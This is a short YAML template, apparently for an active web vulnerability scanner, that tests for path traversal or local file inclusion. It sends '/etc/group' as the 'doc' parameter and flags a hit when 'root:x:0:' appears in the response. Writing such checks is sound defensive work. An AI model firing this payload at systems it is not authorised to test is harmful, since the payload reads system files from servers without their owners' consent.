id: lfi6-1457
name: 'Traversal in doc'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via doc'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      doc:
        - '/etc/group'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:'
